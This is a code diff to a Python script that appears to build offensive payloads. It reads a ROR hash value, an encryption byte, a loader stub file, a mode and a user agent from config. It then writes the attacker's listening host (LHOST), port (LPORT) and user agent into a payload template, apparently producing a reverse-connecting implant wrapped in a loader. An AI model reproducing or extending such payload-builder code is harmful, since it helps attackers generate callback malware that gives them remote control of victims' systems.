@@ -9,10 +9,13 @@ config.read(".conf")
 ROR_VALUE = config.getint("Payload", "ror_value")
 ENCRYPTION_BYTE = config.get("Payload", "encryption_byte")
 PAYLOAD_FILE = config.get("Payload", "filename")
-STUB_FILE = config.get("Loader", "filename")
 
+MODE = config.get("Payload","mode")
 LHOST = config.get("Payload", "lhost")
 LPORT = config.getint("Payload", "lport")
+USER_AGENT = config.get("Payload","user_agent")
+
+STUB_FILE = config.get("Loader", "filename")
 
 WORKING_FOLDER = "temp/"
 
@@ -25,6 +28,11 @@ def main():
 
     print("===========PAYLOAD==============")
     sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%ROR_VALUE%", hex(ROR_VALUE))
+    
+    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LPORT%", hex(LPORT))
+    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST%", LHOST)
+    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%USER-AGENT%", USER_AGENT)
+
     sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST__LPORT%", format_lhost_lport(LHOST,LPORT))
     remaining_tags = extract_tags_from_file(WORKING_FOLDER+PAYLOAD_FILE)
 
